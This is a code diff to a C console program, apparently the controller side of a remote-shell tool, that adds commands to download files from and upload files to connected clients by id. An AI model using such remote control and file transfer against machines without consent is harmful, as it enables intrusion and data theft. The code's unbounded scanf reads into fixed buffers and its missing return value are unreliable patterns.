@@ -78,7 +78,7 @@ int exec_shell_command()
     xclient_t *target_client = xclient_list_find(&list, cid);
     if (target_client == NULL)
     {
-        printf("Client with %hu id didn't find!\r\n", cid);
+        printf("[!] Client with %hu id didn't find!\r\n", cid);
         return -1;
     }
 
@@ -128,15 +128,78 @@ int exec_shell_command()
     xterminal_reset();
     return 0;
 }
+int exec_download_command()
+{
+    uint16_t cid;
+    scanf("%hu", &cid);
+    xclient_t *target_client = xclient_list_find(&list, cid);
+    if (target_client == NULL)
+    {
+        printf("[!] Client with %hu id isn't found!\n", cid);
+        return -1;
+    }
+    xfile_t file;
+    char client_file_path[256];
+    char save_location[256];
+    scanf("%s", client_file_path);
+    scanf("%s", save_location);
+    if (xfopen(save_location, &file, XF_CREAT | XF_EXCL | XF_WRONLY))
+    {
+        printf("[!] failed to open %s: %s\r\n", save_location, strerror(errno));
+        return -1;
+    }
+    if (make_fhandshake(&target_client->socket, client_file_path, &file, XFMODE_DOWNLOAD) == -1)
+    {
+        printf("[!] failed to handshake\r\n");
+        return -1;
+    }
+    if (xfile_recv(&target_client->socket, &file) == -1)
+    {
+        printf("[!] an error occured\r\n");
+        return -1;
+    }
+    return 0;
+}
+int exec_upload_command()
+{
+    uint16_t cid;
+    scanf("%hu", &cid);
+    xclient_t *target_client = xclient_list_find(&list, cid);
+    if (target_client == NULL)
+    {
+        printf("[!] Client with %hu id isn't found!\n", cid);
+        return -1;
+    }
+    xfile_t file;
+    char file_path[256];
+    char client_save_location[256];
+    scanf("%s", file_path);
+    scanf("%s", client_save_location);
+    if (xfopen(file_path, &file, XF_RDONLY))
+    {
+        printf("[!] failed to open %s: %s\r\n", file_path, strerror(errno));
+        return -1;
+    }
+    if (make_fhandshake(&target_client->socket, client_save_location, &file, XFMODE_UPLOAD) == -1)
+    {
+        printf("[!] failed to handshake\r\n");
+        return -1;
+    }
+    if (xfile_send(&target_client->socket, &file) == -1)
+    {
+        printf("[!] an error occured\r\n");
+        return -1;
+    }
+}
 int main()
 {
 
-    if (freopen("./xshell.log", "w", stderr) == NULL)
-    {
-        fprintf(stderr,
-                "[!] freopen() faild to open xshell.log: %s\r\n",
-                strerror(errno));
-    }
+    // if (freopen("./xshell.log", "w", stderr) == NULL)
+    // {
+    //     fprintf(stderr,
+    //             "[!] freopen() faild to open xshell.log: %s\r\n",
+    //             strerror(errno));
+    // }
     // Register clean up for exiting
     atexit(&cleanup);
     xclient_list_create(&list);
@@ -171,7 +234,7 @@ int main()
     pthread_create(&p, NULL, &accept_worker, (void *)&server_socket);
     char command[256];
     print_ascii_art();
-    do
+    while (true)
     {
         printf("> ");
         scanf("%s", command);
@@ -187,11 +250,28 @@ int main()
         {
             exec_shell_command();
         }
-        else if(!strcmp(command,"clear")){
+        else if (!strcmp(command, "clear"))
+        {
             system("clear || cls");
             print_ascii_art();
         }
-    } while (strcmp(command, "exit"));
+        else if (!strcmp(command, "exit"))
+        {
+            break;
+        }
+        else if (!strcmp(command, "download"))
+        {
+            exec_download_command();
+        }
+        else if (!strcmp(command, "upload"))
+        {
+            exec_upload_command();
+        }
+        else
+        {
+            printf("[!] Invalid Command!\nuse help command to list all available commands\n");
+        }
+    }
     isProgramRunning = 0;
     // pthread_join(p, NULL);
     //  xtcpsocket_t client_socket;
